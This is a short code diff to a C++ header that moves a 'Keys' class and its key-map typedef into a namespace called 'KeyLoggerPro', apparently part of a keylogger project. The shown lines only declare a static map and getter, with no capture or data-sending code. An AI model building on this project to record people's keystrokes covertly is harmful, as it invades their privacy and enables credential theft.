@@ -9,14 +9,18 @@
 
 #include "stdafx.h"
 
-typedef std::map<int, KeyPair> KEY_MAP;
+namespace KeyLoggerPro {
 
-class Keys {
+  typedef std::map<int, KeyPair> KEY_MAP;
 
-  private:
-    static KEY_MAP m_Keys;
+  class Keys {
 
-  public:
-    static KEY_MAP getKeys(void);
+    private:
+      static KEY_MAP m_Keys;
 
-};
+    public:
+      static KEY_MAP getKeys(void);
+
+  };
+
+}
